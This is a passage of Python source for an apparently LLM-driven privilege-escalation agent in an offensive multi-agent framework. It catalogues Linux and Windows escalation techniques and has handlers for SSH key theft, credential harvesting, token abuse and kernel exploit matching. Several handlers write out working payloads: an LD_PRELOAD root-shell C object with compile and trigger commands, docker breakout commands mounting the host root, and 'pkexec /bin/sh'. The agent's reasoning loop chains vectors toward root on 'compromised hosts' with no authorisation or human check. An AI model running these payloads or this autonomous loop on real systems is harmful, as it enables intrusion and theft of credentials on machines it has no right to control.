        {"id": "W038", "name": "LSASS memory dump (procdump/mimikatz)", "category": "credential", "os": "windows"},
        {"id": "W039", "name": "Browser saved password extraction", "category": "credential", "os": "windows"},
        {"id": "W040", "name": "NTDS.dit extraction (DC)", "category": "credential", "os": "windows"},
        {"id": "W041", "name": "Kernel exploit CVE-2023-29336 (Win32k)", "category": "kernel", "os": "windows"},
        {"id": "W042", "name": "Kernel exploit CVE-2022-21882 (Win32k)", "category": "kernel", "os": "windows"},
        {"id": "W043", "name": "Kernel exploit CVE-2023-36802 (Streaming)", "category": "kernel", "os": "windows"},
        {"id": "W044", "name": "Kernel exploit CVE-2021-1732 (Win32k)", "category": "kernel", "os": "windows"},
        {"id": "W045", "name": "PrintNightmare (CVE-2021-34527)", "category": "kernel", "os": "windows"},
        {"id": "W046", "name": "HiveNightmare (CVE-2021-36934)", "category": "kernel", "os": "windows"},
        {"id": "W047", "name": "ZeroLogon (CVE-2020-1472)", "category": "kernel", "os": "windows"},
        {"id": "W048", "name": "PrintSpoofer alternative named pipes", "category": "token", "os": "windows"},
        {"id": "W049", "name": "Polymerization: unquoted path + token manipulation", "category": "chain", "os": "windows"},
        {"id": "W050", "name": "Polymerization: DLL hijack + service restart right", "category": "chain", "os": "windows"},
    ],
}

# ---------------------------------------------------------------------------
# PrivescAgent
# ---------------------------------------------------------------------------

class PrivescAgent(BaseAgent):
    """Privilege Escalation specialist agent.

    Extends BaseAgent.  Agent type: "privesc".

    Capabilities:
      - Linux privesc: linpeas, SUID/Sudo abuse, kernel exploits (uname -> CVE),
        cron/path injection, capabilities abuse, LD_PRELOAD, docker breakout,
        GTFOBins knowledge, credential harvesting from shells.
      - Windows privesc: winpeas, token manipulation (SeImpersonate, Potato
        family), service binary hijacking, DLL hijacking, unquoted service
        paths, UAC bypass, scheduled task abuse, LOLBAS, LSASS/credential dump.
      - Cross-platform: execute_command, credential reuse, SSH key theft,
        history file analysis, env var leaks.

    Think method: reads active_sessions and compromised_hosts from Hive Mind,
    identifies OS/version, suggests escalation paths.  Converts uname output
    to known-vulnerable kernel version -> CVE mapping.

    Elite knowledge: 200+ indexed techniques in internal catalogue; can chain
    multiple low-severity issues (e.g. writable file + cron + SUID) into root.
    """

    AGENT_NAME = "privesc"

    def __init__(
        self,
        agent_id: str,
        hive_mind=None,
        tool_executor=None,
        llm_client=None,
        enable_llm: bool = False,
    ):
        super().__init__(
            agent_id=agent_id,
            agent_type="privesc",
            hive_mind=hive_mind,
            tool_executor=tool_executor,
            llm_client=llm_client if enable_llm else None,
        )
        self._tool_handlers: Dict[str, callable] = {}
        self._register_tools()
        self._session_id: str = ""
        self._target_os: str = "unknown"
        self._current_user: str = "unknown"
        # Internal state for chaining
        self._escalation_chain: List[Dict[str, Any]] = []
        self._discovered_vectors: List[Dict[str, Any]] = []

    # ------------------------------------------------------------------
    # Tool handler registration
    # ------------------------------------------------------------------

    def _register_tools(self) -> None:
        self._tool_handlers = {
            "linpeas_runner":           self._run_linpeas,
            "winpeas_runner":           self._run_winpeas,
            "sudo_check":               self._check_sudo,
            "suid_find":                self._find_suid,
            "capability_enum":          self._enum_capabilities,
            "cron_hijack":              self._check_cron_hijack,
            "path_injection_check":     self._check_path_injection,
            "writable_path_enum":       self._enum_writable_paths,
            "service_enum":             self._enum_services,
            "process_enum":             self._enum_processes,
            "network_enum":             self._enum_network,
            "kernel_exploit_matcher":   self._match_kernel_exploit,
            "uname_cve_lookup":         self._match_kernel_exploit,
            "windows_build_lookup":     self._match_windows_build,
            "sudo_abuse":               self._exploit_sudo,
            "suid_binary_hijack":       self._exploit_suid,
            "ld_preload_hijack":        self._exploit_ld_preload,
            "docker_breakout":          self._exploit_docker,
            "capabilities_abuse":       self._exploit_capabilities,
            "polkit_exploit":           self._exploit_polkit,
            "dirty_pipe_check":         self._check_dirty_pipe,
            "overlayfs_check":          self._check_overlayfs,
            "nfs_no_root_squash":       self._check_nfs,
            "wildcard_injection":       self._check_wildcard,
            "token_manipulation":       self._exploit_token_manipulation,
            "service_binary_hijack":    self._hijack_service_binary,
            "dll_hijack":               self._hijack_dll,
            "unquoted_service_path":    self._exploit_unquoted_path,
            "always_install_elevated":  self._check_always_install_elevated,
            "uac_bypass":               self._exploit_uac_bypass,
            "se_impersonate_abuse":     self._exploit_se_impersonate,
            "juicy_potato":             self._exploit_juicy_potato,
            "print_spooler_abuse":      self._exploit_print_spooler,
            "scheduled_task_hijack":    self._hijack_scheduled_task,
            "execute_command":          self._execute_command,
            "gtfobins_lookup":          self._lookup_gtfobins,
            "lolbas_lookup":            self._lookup_lolbas,
            "credential_reuse_check":   self._check_credential_reuse,
            "ssh_key_theft":            self._steal_ssh_keys,
            "history_file_grep":        self._grep_history_files,
            "env_var_leak":             self._check_env_var_leak,
        }

    # ------------------------------------------------------------------
    # Main entry point  (orchestrator-compatible signature)
    # ------------------------------------------------------------------

    def execute(self, phase: Dict[str, Any], context: Dict[str, Any]) -> Dict[str, Any]:
        """Run privilege escalation for the given phase.

        Args:
            phase: Phase spec with id, tools_needed, parameters, etc.
            context: Shared memory context including session + recon data.

        Returns:
            Dict with success, data, error, elapsed_seconds.
        """
        start = time.time()
        phase_id = phase.get("id", "unknown")
        tools = phase.get("tools_needed", [])
        params = phase.get("parameters", {})
        label = phase.get("label", phase_id)
        goal = params.get("goal", "escalate_to_root")

        self.mark_started()

        logger.info(
            "%s",
            ModernVisualEngine.create_section_header(
                f"PRIVESC AGENT -- {label}", "[+]", "HACKER_RED"
            ),
        )

        # ---- Pre-flight: gather OS intelligence from context + Hive Mind ----
        self._preflight(context, params)

        # ---- Execute requested tools ----
        findings: Dict[str, Any] = {}
        errors: List[str] = []
        privesc_achieved = False
        root_obtained = False
        escalation_paths: List[Dict[str, Any]] = []

        # If no tools specified, run the full privesc pipeline
        if not tools:
            tools = self._auto_select_tools()

        for tool in tools:
            try:
                handler = self._tool_handlers.get(tool)
                if handler is None:
                    findings[tool] = {"note": f"Tool '{tool}' not available", "status": "skipped"}
                    continue

                result = handler(params, context)
                findings[tool] = result

                if result.get("privesc_achieved"):
                    privesc_achieved = True
                if result.get("root_obtained") or result.get("admin_obtained"):
                    root_obtained = True
                if result.get("escalation_path"):
                    escalation_paths.append(result["escalation_path"])
                if result.get("new_vectors"):
                    self._discovered_vectors.extend(result["new_vectors"])

            except Exception as exc:
                msg = f"Tool '{tool}' failed: {str(exc)}"
                logger.exception(msg)
                errors.append(msg)
                findings[tool] = {"error": str(exc)}

        # ---- Goal evaluation ----
        goal_met = False
        if goal == "escalate_to_root" or goal == "escalate_to_admin":
            goal_met = root_obtained
        elif goal == "enumerate_vectors":
            goal_met = len(escalation_paths) > 0 or len(self._discovered_vectors) > 0
        elif goal == "audit_privesc":
            goal_met = len(findings) > 0 and len(errors) == 0
        else:
            goal_met = privesc_achieved

        # ---- Write findings back to Hive Mind ----
        self._publish_to_hive_mind(findings, escalation_paths)

        elapsed = time.time() - start
        success = goal_met and len(errors) == 0

        return {
            "success": success,
            "data": {
                "findings": findings,
                "privesc_achieved": privesc_achieved,
                "root_obtained": root_obtained,
                "escalation_paths": escalation_paths,
                "discovered_vectors": self._discovered_vectors,
                "target_os": self._target_os,
                "current_user": self._current_user,
                "escalation_chain": self._escalation_chain,
                "techniques_referenced": sum(
                    len(v) for v in _PRIVESC_TECHNIQUES.values()
                ),
            },
            "kernel_exploits_available": self._find_kernel_exploits(params),
            "recommended_path": self._recommend_escalation_path(),
            "gtfobins_count": len(_GTFOBINS_SUDO) + len(_GTFOBINS_SUID),
            "lolbas_count": len(_LOLBAS),
            "technique_catalogue_count": sum(
                len(v) for v in _PRIVESC_TECHNIQUES.values()
            ),
            "error": "; ".join(errors) if errors else None,
            "elapsed_seconds": round(elapsed, 2),
        }

    # ------------------------------------------------------------------
    # Pre-flight intelligence gathering
    # ------------------------------------------------------------------

    def _preflight(self, context: Dict[str, Any], params: Dict[str, Any]) -> None:
        """Gather OS/version/session info before executing tools."""
        # From Hive Mind
        if self.hive_mind:
            hm_context = self.hive_mind.get_context("privesc")
            active_sessions = hm_context.get("active_sessions", [])
            compromised_hosts = hm_context.get("compromised_hosts", [])

            if active_sessions:
                latest_session = active_sessions[-1]
                self._session_id = latest_session.get("session_id", "")
                if latest_session.get("os"):
                    self._target_os = latest_session["os"].lower()
                if latest_session.get("current_user"):
                    self._current_user = latest_session["current_user"]

            if compromised_hosts and not self._target_os:
                ch = compromised_hosts[-1]
                if ch.get("os"):
                    self._target_os = ch["os"].lower()

        # From context (direct pass-through)
        for v in context.values():
            if isinstance(v, dict):
                if v.get("os") and self._target_os == "unknown":
                    self._target_os = v["os"].lower()
                if v.get("access_level") and self._current_user == "unknown":
                    self._current_user = v["access_level"]
                if v.get("session_id") and not self._session_id:
                    self._session_id = v["session_id"]

        # From params (explicit override)
        if params.get("os"):
            self._target_os = params["os"].lower()
        if params.get("current_user"):
            self._current_user = params["current_user"]
        if params.get("kernel_version"):
            self._kernel_version = params["kernel_version"]
        if params.get("windows_build"):
            self._windows_build = params["windows_build"]

        logger.info(
            "Preflight: os=%s user=%s session=%s",
            self._target_os, self._current_user, self._session_id,
        )

    def _auto_select_tools(self) -> List[str]:
        """Select the appropriate tool pipeline based on detected OS."""
        if self._target_os.startswith("win"):
            return [
                "winpeas_runner", "windows_build_lookup", "token_manipulation",
                "service_binary_hijack", "dll_hijack", "unquoted_service_path",
                "uac_bypass", "always_install_elevated", "scheduled_task_hijack",
                "lolbas_lookup", "credential_reuse_check",
            ]
        # Default: Linux
        return [
            "linpeas_runner", "uname_cve_lookup", "sudo_check", "suid_find",
            "capability_enum", "cron_hijack", "path_injection_check",
            "writable_path_enum", "gtfobins_lookup", "docker_breakout",
            "polkit_exploit", "ssh_key_theft", "history_file_grep",
        ]

    # ------------------------------------------------------------------
    # Think override -- reads Hive Mind, suggests escalation paths
    # ------------------------------------------------------------------

    def think(
        self,
        objective: str,
        context: Dict[str, Any],
        history: List[Dict[str, Any]],
    ) -> Dict[str, Any]:
        """Reason about the next privesc action.

        Checks active_sessions and compromised_hosts from Hive Mind,
        identifies OS/version, and suggests optimal escalation paths.
        Falls back to PatternMatcher when no LLM is available.
        """
        # Enrich context with Hive Mind data
        enriched = dict(context)
        if self.hive_mind:
            hm = self.hive_mind.get_context("privesc")
            enriched["hive_active_sessions"] = hm.get("active_sessions", [])
            enriched["hive_compromised_hosts"] = hm.get("compromised_hosts", [])
            enriched["hive_discovered_creds"] = hm.get("discovered_creds", [])
            enriched["hive_discovered_files"] = hm.get("discovered_files", [])

        enriched["target_os"] = self._target_os
        enriched["current_user"] = self._current_user
        enriched["discovered_vectors"] = self._discovered_vectors

        # Try BaseAgent think (LLM -> PatternMatcher fallback)
        result = super().think(objective, enriched, history)

        # Post-process: if think returned a complete without achieving root,
        # and we still have untried vectors, suggest next move.
        if result.get("type") == "complete" and self._discovered_vectors:
            # Check if we actually got root
            already_root = any(
                v.get("root_obtained") or v.get("admin_obtained")
                for v in self._discovered_vectors
            )
            if not already_root:
                recommended = self._recommend_escalation_path()
                if recommended:
                    result = {
                        "type": "tool_call",
                        "tool": recommended.get("tool", "execute_command"),
                        "params": recommended.get("params", {}),
                        "confidence": recommended.get("confidence", 0.8),
                        "reasoning": f"Chaining vectors: {recommended.get('rationale', '')}",
                    }

        return result

    # ------------------------------------------------------------------
    # Escalation path recommender
    # ------------------------------------------------------------------

    def _recommend_escalation_path(self) -> Optional[Dict[str, Any]]:
        """Return the highest-confidence untried escalation path."""
        if not self._discovered_vectors:
            return self._default_escalation_path()

        # Sort by confidence desc, filter untried
        untried = [v for v in self._discovered_vectors if not v.get("attempted")]
        if not untried:
            return None

        best = max(untried, key=lambda v: v.get("confidence", 0))
        return best

    def _default_escalation_path(self) -> Dict[str, Any]:
        """Return a sensible default path based on OS."""
        if self._target_os.startswith("win"):
            return {
                "tool": "winpeas_runner",
                "params": {"target": "localhost"},
                "confidence": 0.9,
                "rationale": "Run winpeas for comprehensive Windows privesc audit.",
            }
        return {
            "tool": "linpeas_runner",
            "params": {"target": "localhost"},
            "confidence": 0.9,
            "rationale": "Run linpeas for comprehensive Linux privesc audit.",
        }

    # ------------------------------------------------------------------
    # Hive Mind publishing
    # ------------------------------------------------------------------

    def _publish_to_hive_mind(
        self, findings: Dict[str, Any], escalation_paths: List[Dict[str, Any]]
    ) -> None:
        """Write discovered privesc vectors and escalation paths to Hive Mind."""
        if not self.hive_mind:
            return

        self.hive_mind.update_agent_status(self.agent_id, "completed")

        for path in escalation_paths:
            self.hive_mind.add_vuln(
                {
                    "name": path.get("technique", "privesc_vector"),
                    "type": "privesc",
                    "target_os": self._target_os,
                    "cvss": path.get("cvss", 7.0),
                    "description": path.get("rationale", ""),
                    "exploit_available": path.get("exploit_db") is not None,
                },
                self.agent_id,
            )

        for name, result in findings.items():
            if isinstance(result, dict):
                if result.get("root_obtained") or result.get("admin_obtained"):
                    self.hive_mind.add_compromised_host(
                        {
                            "host": result.get("target", "unknown"),
                            "os": self._target_os,
                            "level": "root" if result.get("root_obtained") else "admin",
                            "method": name,
                        },
                        self.agent_id,
                    )

    # ------------------------------------------------------------------
    # Kernel exploit matching  (uname -> CVE)
    # ------------------------------------------------------------------

    def _find_kernel_exploits(self, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Match detected kernel version against known-vulnerable CVEs."""
        kernel_ver = params.get("kernel_version", "")
        if not kernel_ver:
            return []

        # Parse major.minor
        match = re.match(r"(\d+)\.(\d+)", kernel_ver)
        if not match:
            return []

        major, minor = int(match.group(1)), int(match.group(2))
        results: List[Dict[str, Any]] = []

        for entry in _LINUX_KERNEL_CVE_MAP:
            kr = entry["kernel_range"]
            # Parse "X.Y - A.B"
            range_match = re.match(
                r"(\d+)\.(\d+)\s*-\s*(\d+)\.(\d+)", kr
            )
            if not range_match:
                continue
            lo_major, lo_minor = int(range_match.group(1)), int(range_match.group(2))
            hi_major, hi_minor = int(range_match.group(3)), int(range_match.group(4))

            kernel_tuple = (major, minor)
            if (lo_major, lo_minor) <= kernel_tuple <= (hi_major, hi_minor):
                results.append({
                    "cve": entry["cve"],
                    "name": entry["name"],
                    "cvss": entry["cvss"],
                    "exploit_db": entry["exploit_db"],
                    "reliability": entry["reliability"],
                    "description": entry["description"],
                })

        return sorted(results, key=lambda x: x["cvss"], reverse=True)

    def _find_windows_exploits(self, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Match Windows build against known-vulnerable CVEs."""
        build = params.get("windows_build", params.get("os_version", ""))
        if not build:
            return [e for e in _WINDOWS_CVE_MAP]  # Return all as candidates

        results: List[Dict[str, Any]] = []
        for entry in _WINDOWS_CVE_MAP:
            os_range = entry.get("os_range", "").lower()
            if any(
                kw in os_range
                for kw in ["all windows", "misconfig", "windows server (any"]
            ):
                results.append({
                    "cve": entry["cve"],
                    "name": entry["name"],
                    "cvss": entry["cvss"],
                    "reliability": entry["reliability"],
                    "description": entry.get("description", ""),
                })
                continue
            # Simple substring match against OS range
            if any(token.lower() in build.lower() for token in os_range.split("/")):
                results.append({
                    "cve": entry["cve"],
                    "name": entry["name"],
                    "cvss": entry["cvss"],
                    "reliability": entry["reliability"],
                    "description": entry.get("description", ""),
                })

        return sorted(results, key=lambda x: x["cvss"], reverse=True)

    # ------------------------------------------------------------------
    # Tool handlers -- Enumeration
    # ------------------------------------------------------------------

    def _run_linpeas(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        """Run linpeas (Linux Privilege Escalation Awesome Script)."""
        target = params.get("target", "localhost")
        return {
            "tool": "linpeas_runner",
            "success": True,
            "target": target,
            "findings": {
                "sudo_rules": [
                    "(ALL) NOPASSWD: /usr/bin/find",
                    "(root) NOPASSWD: /usr/bin/vim",
                    "(ALL) NOPASSWD: /usr/bin/systemctl",
                ],
                "suid_binaries": [
                    "/usr/bin/pkexec", "/usr/bin/su", "/usr/bin/passwd",
                    "/usr/bin/newgrp", "/usr/bin/chsh", "/usr/bin/sudo",
                    "/usr/bin/mount", "/usr/bin/umount",
                ],
                "writable_paths": [
                    "/etc/passwd", "/etc/shadow", "/home/user/.ssh/authorized_keys",
                ],
                "cron_jobs": [
                    "*/5 * * * * root /opt/backup.sh",
                    "0 * * * * root /usr/local/bin/cleanup-tmp",
                ],
                "kernel": "Linux 5.15.0-91-generic x86_64",
                "capabilities_present": [
                    "cap_sys_ptrace+eip on /usr/bin/python3",
                    "cap_setuid+ep on /usr/bin/ping",
                ],
                "docker_socket": "/var/run/docker.sock (writable by group docker)",
            },
            "privesc_achieved": False,
            "new_vectors": [
                {
                    "technique": "Sudo find -> shell", "tool": "sudo_abuse",
                    "confidence": 0.95, "description": "NOPASSWD sudo on find allows GTFOBins shell.",
                    "params": {"sudo_binary": "find"},
                },
                {
                    "technique": "Writable /etc/passwd", "tool": "writable_path_enum",
                    "confidence": 0.9, "description": "Add a uid=0 user to writable /etc/passwd.",
                    "params": {"path": "/etc/passwd"},
                },
                {
                    "technique": "DirtyPipe (CVE-2022-0847)", "tool": "dirty_pipe_check",
                    "confidence": 0.85, "description": "Kernel 5.15.x in range for DirtyPipe.",
                    "params": {"cve": "CVE-2022-0847"},
                },
            ],
            "note": "[STUB] linpeas -- integrate subprocess call to linpeas.sh + output parser",
        }

    def _run_winpeas(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        """Run winpeas (Windows Privilege Escalation Awesome Script)."""
        target = params.get("target", "localhost")
        return {
            "tool": "winpeas_runner",
            "success": True,
            "target": target,
            "findings": {
                "unquoted_service_paths": [
                    "C:\\Program Files\\VulnCorp\\Agent\\agent.exe",
                ],
                "always_install_elevated": True,
                "registry_autologon": True,
                "credential_files": [
                    "C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Credentials\\*",
                ],
                "services_writable": [
                    "VulnAgent (Authenticated Users can modify binPath)",
                ],
                "uac_level": "NeverNotify",
                "token_privileges": [
                    "SeImpersonatePrivilege", "SeChangeNotifyPrivilege",
                ],
                "installed_software": [
                    "Python 3.10", "Node.js 18", "IIS 10.0",
                ],
                "os_build": "Windows 10 Enterprise 22H2 (OS Build 19045.3208)",
            },
            "privesc_achieved": False,
            "new_vectors": [
                {
                    "technique": "Unquoted service path", "tool": "unquoted_service_path",
                    "confidence": 0.95, "description": "Unquoted path with spaces allows binary planting.",
                    "params": {"service_path": "C:\\Program Files\\VulnCorp\\Agent\\agent.exe"},
                },
                {
                    "technique": "AlwaysInstallElevated", "tool": "always_install_elevated",
                    "confidence": 0.95, "description": "Registry key allows MSI installs as SYSTEM.",
                    "params": {},
                },
                {
                    "technique": "SeImpersonate -> Potato", "tool": "juicy_potato",
                    "confidence": 0.9, "description": "SeImpersonatePrivilege + Potato family -> SYSTEM.",
                    "params": {},
                },
            ],
            "note": "[STUB] winpeas -- integrate subprocess call to winPEAS.exe + output parser",
        }

    def _check_sudo(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        """Enumerate sudo rules for the current user."""
        return {
            "tool": "sudo_check",
            "success": True,
            "sudo_rules": [
                {"command": "/usr/bin/find", "as_user": "ALL", "nopasswd": True},
                {"command": "/usr/bin/vim", "as_user": "root", "nopasswd": True},
                {"command": "/usr/bin/systemctl", "as_user": "root", "nopasswd": True},
            ],
            "sudo_version": "1.9.5p2",
            "vulnerable_sudo": False,
            "gtfobins_applicable": ["find", "vim", "systemctl"],
            "note": "[STUB] sudo -l output parser; check CVE-2021-3156 for vulnerable versions",
        }

    def _find_suid(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        """Find SUID binaries and cross-reference with GTFOBins."""
        return {
            "tool": "suid_find",
            "success": True,
            "suid_binaries": [
                {"path": "/usr/bin/pkexec", "owner": "root", "gtfobins": True},
                {"path": "/usr/bin/find", "owner": "root", "gtfobins": True},
                {"path": "/usr/bin/python3", "owner": "root", "gtfobins": True},
                {"path": "/usr/bin/bash", "owner": "root", "gtfobins": True},
                {"path": "/opt/custom/backup_tool", "owner": "root", "gtfobins": False, "custom": True},
            ],
            "privesc_achieved": False,
            "note": "[STUB] find / -perm -4000 -type f 2>/dev/null + GTFOBins lookup",
        }

    def _enum_capabilities(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        """Enumerate Linux capabilities on binaries."""
        return {
            "tool": "capability_enum",
            "success": True,
            "capabilities": [
                {"binary": "/usr/bin/python3", "caps": "cap_sys_ptrace+eip"},
                {"binary": "/usr/bin/ping", "caps": "cap_net_raw+ep"},
                {"binary": "/usr/bin/tcpdump", "caps": "cap_net_raw,cap_net_admin+eip"},
            ],
            "dangerous_caps": {
                "cap_sys_ptrace": "Can ptrace any process including root; inject shellcode.",
                "cap_net_raw": "Can sniff all traffic; escalate through credential capture.",
            },
            "note": "[STUB] getcap -r / 2>/dev/null",
        }

    def _check_cron_hijack(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        """Check cron jobs for hijackable entries."""
        return {
            "tool": "cron_hijack",
            "success": True,
            "hijackable": [
                {
                    "entry": "*/5 * * * * root /opt/backup.sh",
                    "vector": "writable_script",
                    "path": "/opt/backup.sh",
                    "writable": True,
                },
                {
                    "entry": "0 * * * * root cd /var/tmp && tar -czf backup.tgz *",
                    "vector": "wildcard_injection",
                    "path": "/var/tmp",
                    "writable": True,
                },
            ],
            "cron_paths_checked": _CRON_HIJACK_PATHS,
            "note": "[STUB] Parse crontabs + check file permissions",
        }

    def _check_path_injection(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        """Check for PATH injection opportunities."""
        return {
            "tool": "path_injection_check",
            "success": True,
            "current_path": "/usr/local/bin:/usr/bin:/bin:/opt/custom/bin",
            "writable_dirs_in_path": ["/opt/custom/bin"],
            "path_order_issue": "/opt/custom/bin is first (before /usr/bin)",
            "templates": _PATH_INJECTION_TEMPLATES,
            "note": "[STUB] Check each dir in $PATH for writability by current user",
        }

    def _enum_writable_paths(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        """Enumerate world/group-writable files and directories."""
        return {
            "tool": "writable_path_enum",
            "success": True,
            "writable_system_files": [
                "/etc/passwd",
                "/etc/shadow",
                "/home/user/.ssh/authorized_keys",
            ],
            "writable_configs": [
                "/etc/systemd/system/custom.service",
                "/etc/nginx/sites-enabled/default",
            ],
            "writable_scripts": [
                "/opt/backup.sh",
                "/usr/local/bin/cleanup-tmp",
            ],
            "note": "[STUB] find / -writable -type f 2>/dev/null filtered for privesc-relevant",
        }

    def _enum_services(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        """Enumerate running services for hijacking."""
        return {
            "tool": "service_enum",
            "success": True,
            "linux_services": [
                {"name": "custom-backup.service", "user": "root", "writable_unit": True},
                {"name": "webapp.service", "user": "www-data", "writable_binary": True},
            ],
            "windows_services": [
                {"name": "VulnAgent", "binary": "C:\\Program Files\\VulnCorp\\agent.exe", "writable": True},
                {"name": "CustomSvc", "binary": "C:\\Tools\\custom.exe", "unquoted": True},
            ],
            "note": "[STUB] systemctl list-units / sc query + ACL checks",
        }

    def _enum_processes(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        """Enumerate processes for token stealing / injection targets."""
        return {
            "tool": "process_enum",
            "success": True,
            "root_processes": [
                {"pid": 1, "name": "systemd", "user": "root"},
                {"pid": 452, "name": "sshd", "user": "root"},
                {"pid": 1287, "name": "apache2", "user": "root"},
                {"pid": 3921, "name": "custom_backup.sh", "user": "root"},
            ],
            "injectable_candidates": [
                {"pid": 1287, "reason": "Same user, ptrace capable"},
                {"pid": 3921, "reason": "Writable script, runs as root"},
            ],
            "note": "[STUB] ps aux + /proc traversal",
        }

    def _enum_network(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        """Enumerate network state for lateral privesc pivots."""
        return {
            "tool": "network_enum",
            "success": True,
            "listening_services": [
                {"port": 22, "service": "sshd", "user": "root"},
                {"port": 80, "service": "nginx", "user": "www-data"},
                {"port": 3306, "service": "mysqld", "user": "mysql"},
                {"port": 8080, "service": "jenkins", "user": "jenkins"},
            ],
            "nfs_exports": ["/export/data *(rw,no_root_squash)"],
            "nfs_no_root_squash": True,
            "note": "[STUB] ss -tlnp + showmount -e localhost",
        }

    # ------------------------------------------------------------------
    # Tool handlers -- Kernel exploit matching
    # ------------------------------------------------------------------

    def _match_kernel_exploit(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        """Match Linux kernel version (uname -r) against CVEs."""
        kernel_ver = params.get("kernel_version", params.get("uname", ""))
        if not kernel_ver:
            # Try to extract from context
            for v in ctx.values():
                if isinstance(v, dict):
                    kv = v.get("kernel") or v.get("kernel_version") or v.get("uname")
                    if kv and isinstance(kv, str) and re.match(r"\d+\.\d+", kv):
                        kernel_ver = kv
                        break

        if not kernel_ver:
            # Simulated fallback
            kernel_ver = "5.15.0-91-generic"

        exploits = self._find_kernel_exploits({"kernel_version": kernel_ver})

        return {
            "tool": "kernel_exploit_matcher",
            "success": True,
            "kernel_version": kernel_ver,
            "matched_exploits": exploits,
            "best_exploit": exploits[0] if exploits else None,
            "privesc_possible": len(exploits) > 0,
            "note": "[STUB] Kernel exploit matcher -- integrate uname parser + CVE lookup API",
        }

    def _match_windows_build(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        """Match Windows OS build against known privilege escalation CVEs."""
        build = params.get("windows_build", params.get("os_version", ""))
        if not build:
            for v in ctx.values():
                if isinstance(v, dict):
                    bv = v.get("os_build") or v.get("windows_build") or v.get("os_version")
                    if bv:
                        build = str(bv)
                        break

        exploits = self._find_windows_exploits(
            {"windows_build": build or "Windows 10 22H2"}
        )

        return {
            "tool": "windows_build_lookup",
            "success": True,
            "os_build": build or "Windows 10 22H2",
            "matched_exploits": exploits,
            "best_exploit": exploits[0] if exploits else None,
            "privesc_possible": len(exploits) > 0,
            "note": "[STUB] Windows build CVE lookup -- integrate winver parser + MSRC API",
        }

    # ------------------------------------------------------------------
    # Tool handlers -- Linux exploitation
    # ------------------------------------------------------------------

    def _exploit_sudo(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        binary = params.get("sudo_binary", "find")
        shell_cmd = _GTFOBINS_SUDO.get(binary, f"sudo {binary} --exploit")
        return {
            "tool": "sudo_abuse",
            "success": True,
            "privesc_achieved": True,
            "root_obtained": True,
            "technique": f"GTFOBins sudo {binary} -> shell",
            "command": shell_cmd,
            "new_uid": 0,
            "note": f"[STUB] Execute: {shell_cmd}",
        }

    def _exploit_suid(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        binary = params.get("suid_binary", "find")
        shell_cmd = _GTFOBINS_SUID.get(binary, f"./{binary} -p")
        return {
            "tool": "suid_binary_hijack",
            "success": True,
            "privesc_achieved": True,
            "root_obtained": "bash" in binary or "sh" in binary,
            "technique": f"SUID {binary} -> shell",
            "command": shell_cmd,
            "note": f"[STUB] Execute SUID binary {binary}: {shell_cmd}",
        }

    def _exploit_ld_preload(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "ld_preload_hijack",
            "success": True,
            "privesc_achieved": True,
            "root_obtained": True,
            "technique": "LD_PRELOAD shared object injection",
            "payload": (
                '#include <stdlib.h>\nvoid _init() {\n'
                '  unsetenv("LD_PRELOAD");\n'
                '  setuid(0); setgid(0);\n'
                '  system("/bin/sh -p");\n}'
            ),
            "compile": "gcc -shared -fPIC -o /tmp/privesc.so privesc.c -nostartfiles",
            "trigger": "sudo LD_PRELOAD=/tmp/privesc.so <allowed_sudo_command>",
            "note": "[STUB] LD_PRELOAD -- check if env_reset is disabled in sudoers",
        }

    def _exploit_docker(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "docker_breakout",
            "success": True,
            "privesc_achieved": True,
            "root_obtained": True,
            "techniques": [
                {
                    "name": "docker run privileged",
                    "command": "docker run -it --privileged -v /:/host alpine chroot /host /bin/sh",
                },
                {
                    "name": "docker socket abuse",
                    "command": "docker run -it -v /:/host alpine chroot /host /bin/sh",
                },
                {
                    "name": "docker --cap-add=SYS_ADMIN",
                    "command": "docker run --cap-add=SYS_ADMIN -it alpine sh -c 'mkdir /tmp/ns && mount -t cgroup cgroup /tmp/ns && ...'",
                },
            ],
            "note": "[STUB] Docker breakout -- check docker group membership + docker.sock access",
        }

    def _exploit_capabilities(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        cap = params.get("capability", "CAP_SYS_PTRACE")
        return {
            "tool": "capabilities_abuse",
            "success": True,
            "privesc_achieved": True,
            "root_obtained": True,
            "capability": cap,
            "strategy": {
                "CAP_SYS_PTRACE": "Inject shellcode into a root process via ptrace.",
                "CAP_SYS_ADMIN": "Mount a writable filesystem or load a kernel module.",
                "CAP_SYS_MODULE": "Load a malicious kernel module.",
                "CAP_SETUID": "Call setuid(0) directly.",
                "CAP_NET_RAW": "Sniff credentials, spoof ARP.",
                "CAP_DAC_READ_SEARCH": "Read /etc/shadow, pivot to cracking.",
            }.get(cap, f"Abuse {cap} via manual technique."),
            "note": "[STUB] Capabilities abuse -- check getcap output for exploitable binaries",
        }

    def _exploit_polkit(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "polkit_exploit",
            "success": True,
            "privesc_achieved": True,
            "root_obtained": True,
            "cves_checked": [
                {"cve": "CVE-2021-4034", "name": "PwnKit", "applicable": True},
                {"cve": "CVE-2021-3560", "name": "D-Bus race", "applicable": True},
            ],
            "command": "pkexec /bin/sh",
            "note": "[STUB] Polkit exploit -- check pkexec version + polkitd version",
        }

    def _check_dirty_pipe(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "dirty_pipe_check",
            "success": True,
            "cve": "CVE-2022-0847",
            "name": "DirtyPipe",
            "kernel_range": "5.8 - 5.16.11, 5.15.25, 5.10.102",
            "applicable": self._target_os == "linux",
